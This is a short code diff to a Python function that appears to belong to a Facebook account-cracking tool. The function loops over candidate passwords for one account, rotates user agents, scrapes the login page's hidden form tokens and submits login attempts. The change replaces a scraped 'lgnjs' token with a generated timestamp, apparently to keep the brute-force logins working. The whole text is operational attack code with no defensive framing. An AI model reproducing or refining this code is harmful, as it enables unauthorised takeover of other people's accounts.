@@ -1255,6 +1255,7 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
+   lgnjs = str(int(time.time()))
    free_fb = session.get('https://m.facebook.com').text
    log_data ={
     'email': idf,
@@ -1264,7 +1265,7 @@ def m5(idf,pwv):
     'lgndim': re.search(r'name="lgndim" value="(.*?)"', free_fb).group(1),
     'lsd': re.search(r'name="lsd" value="(.*?)"', free_fb).group(1),
     'jazoest': re.search(r'name="jazoest" value="(.*?)"', free_fb).group(1),
-    'lgnjs': re.search(r'name="lgnjs" value="(.*?)"', free_fb).group(1),
+    'lgnjs': lgnjs,
     'locale': 'en_GB',
     'login_source': 'comet_headerless_login',
     'login': 'Log In'}
